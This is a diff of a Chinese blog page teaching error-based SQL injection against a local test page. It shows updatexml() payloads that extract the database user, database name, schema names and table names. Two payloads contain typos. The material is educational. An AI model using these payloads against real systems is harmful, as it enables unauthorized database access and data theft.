@@ -242,9 +242,22 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-10-09 22:22:49" itemprop="dateModified" datetime="2019-10-09T22:22:49+08:00">2019-10-09</time>
+                <time title="修改时间：2019-10-09 22:26:46" itemprop="dateModified" datetime="2019-10-09T22:26:46+08:00">2019-10-09</time>
               </span>
             
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -258,7 +271,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>0X00    报错注入攻击</p><p>​    报错注入攻击的测试地址：<a href="http://127.0.0.1/error.php?username=1。" target="_blank" rel="noopener">http://127.0.0.1/error.php?username=1。</a><br>​    首先访问<a href="http://127.0.0.1/error.php?username=1&#39;，因为参数username的值是1&#39;，在数据库中执行sql时，会因为多了一个单引号而报错。" target="_blank" rel="noopener">http://127.0.0.1/error.php?username=1&#39;，因为参数username的值是1&#39;，在数据库中执行sql时，会因为多了一个单引号而报错。</a><br>图1<br>​    通过页面返回结果可以看出，程序直接将错误信息输出到了页面上，所以此处可以利用报错注入获取数据。报错注入有多种格式，此处利用函数updatexml()演示sql语句获取user()的值。<br><code>&#39;and updatexml(1,cocat(0x7e,(select user()),0x7e),1)--+&#39;</code><br>​    其中0x7e是ASCII编码，解码结果为~。<br>图2<br>​    然后尝试获取当前数据库的库名。<br><code>&#39;and updatexml(1.concat(0x7e,(select database()),0x7e),1)--+&#39;</code><br>图3<br>​    接着可以利用select语句继续获取数据库中的库名、表名和字段名，查询语句与union注入的相同。因为报错注入只显示一条结果，所以需要使用limit语句。构造的语句如下所示。<br><code>&#39;and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+</code><br>​    可以获取数据库的库名。<br>图4<br>​    构造查询表名的语句，可以获取数据库test的表名。<br><code>’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;test&#39; limit 0,1),0x7e),1)</code><br>图5</p>
+          <p>0X00    报错注入攻击</p><p>​    报错注入攻击的测试地址：<a href="http://127.0.0.1/error.php?username=1。" target="_blank" rel="noopener">http://127.0.0.1/error.php?username=1。</a><br>​    首先访问<a href="http://127.0.0.1/error.php?username=1&#39;，因为参数username的值是1&#39;，在数据库中执行sql时，会因为多了一个单引号而报错。" target="_blank" rel="noopener">http://127.0.0.1/error.php?username=1&#39;，因为参数username的值是1&#39;，在数据库中执行sql时，会因为多了一个单引号而报错。</a><br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/100801.png" alt><br>​    通过页面返回结果可以看出，程序直接将错误信息输出到了页面上，所以此处可以利用报错注入获取数据。报错注入有多种格式，此处利用函数updatexml()演示sql语句获取user()的值。<br><code>&#39;and updatexml(1,cocat(0x7e,(select user()),0x7e),1)--+&#39;</code><br>​    其中0x7e是ASCII编码，解码结果为~。<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/100802.png" alt><br>​    然后尝试获取当前数据库的库名。<br><code>&#39;and updatexml(1.concat(0x7e,(select database()),0x7e),1)--+&#39;</code><br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/100803.png" alt><br>​    接着可以利用select语句继续获取数据库中的库名、表名和字段名，查询语句与union注入的相同。因为报错注入只显示一条结果，所以需要使用limit语句。构造的语句如下所示。<br><code>&#39;and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+</code><br>​    可以获取数据库的库名。<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/100804.png" alt><br>​    构造查询表名的语句，可以获取数据库test的表名。<br><code>’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;test&#39; limit 0,1),0x7e),1)</code><br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/100805.png" alt></p>
           <!--noindex-->
           
             <div class="post-button text-center">
